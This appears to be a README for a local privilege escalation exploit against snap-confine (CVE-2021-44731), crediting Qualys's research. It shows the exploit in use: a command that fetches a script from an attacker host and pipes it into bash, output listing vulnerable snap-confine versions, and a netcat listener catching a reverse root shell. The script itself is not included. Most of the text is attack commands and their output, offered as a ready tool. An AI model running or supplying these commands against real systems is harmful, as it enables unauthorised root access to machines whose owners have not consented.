# CVE-2021-44731-snap-confine-SUID
Local Privilege Escalation Exploit for CVE-2021-44731, snap-confine 2.54.2 and lower

All credit to Qualys for finding this and providing a detailed exploit. 

https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt

Quick and Dirty snap-confine LPE. Will search for vulnerable version of snap-confine, if found will then exploit.

Returns a root shell, catch with netcat

```c
$id
uid=1001(vulnchain) gid=1001(vulnchain) groups=1001(vulnchain)
$ curl http://10.8.0.134/snap_confine_LPE.sh | bash
curl http://10.8.0.134/snap_confine_LPE.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2073  100  2073    0     0  28397      0 --:--:-- --:--:-- --:--:-- 28013
Non-vulnerable version found: 2.54.3
Vulnerable version found: 2.44.3 at /usr/lib/snapd/snap-confine
Vulnerable version found: 2.44.3 at /home/vulnchain/snap-confine
Performing actions with a vulnerable version...
Chosen vulnerable version: 2.44.3
```

## Root Shell
```c
┌──(root㉿kali)-[~]
└─# nc -lvnp 4447    
listening on [any] 4447 ...
connect to [10.8.0.134] from (UNKNOWN) [10.10.111.136] 56050
bash: cannot set terminal process group (609): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-10-14:/# id
id
uid=0(root) gid=0(root) groups=0(root),1001(vulnchain)
root@ip-10-10-10-14:/# 
```
